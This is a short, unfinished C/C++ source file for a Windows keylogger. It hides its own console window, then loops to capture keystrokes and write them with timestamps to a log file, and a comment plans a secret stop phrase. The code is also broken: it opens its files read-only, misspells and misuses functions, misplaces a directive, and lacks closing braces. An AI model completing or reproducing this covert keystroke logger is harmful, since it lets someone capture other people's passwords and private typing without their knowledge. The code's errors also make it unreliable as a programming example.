//#include<iostream>
#include<windows.h>
//#include<fstream>
#include<stdbool.h>
#include<stdlib.h>
#include<stdio.h>
#include<conio.h>
#include<string>
#include<time.h> using namespace std;


int main()
{

	FILE* log;
	char input;
	log = fopen("c:\\test.txt", "r");

	// Time stuff.
	time_t t;
	t = time(NULL);

	// Hides the window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	
	bool runlogger = true;
	//where your logs are stored
	log = fopen("D://Text.txt", "r");

	//TODO displaying error message when unable to open file


	//Code for hiding running dialog
	HWND hideIt = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(hideIt, 0);
	//Logic for capturing keystokes ........
	while (true) {
		Sleep(16.66667);
		if (khbit()) {
			input = getchar;
			
			fprintf(log, input, ctime(&t));

		}
		//use queue to check if the last [BLANK] inputs are equal to the string [BLANK], if (true) close program and close the file
		//concatinate char into string till



	}
